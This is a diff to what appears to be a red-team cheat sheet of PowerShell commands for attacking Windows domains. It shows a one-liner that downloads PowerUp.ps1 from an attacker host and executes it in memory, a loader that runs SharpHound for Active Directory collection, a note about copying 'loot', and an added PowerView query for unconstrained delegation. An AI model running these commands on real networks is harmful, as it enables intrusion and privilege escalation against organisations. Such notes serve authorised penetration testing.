@@ -1,4 +1,3 @@
-
 ```powershell
 Import-Module .\PowerUp.ps1
 iex(iwr 'http://172.16.100.48/PowerUp.ps1' -useb)
@@ -31,3 +30,8 @@ C:\Users\Public\Loader.exe -Path C:\Users\Public\\SharpHound.exe -args --collect
 ```
 
 > Copy over to A:\loot
+
+Unconstrained delegation?
+```powershell
+Get-DomainComputer -UnConstrained
+```
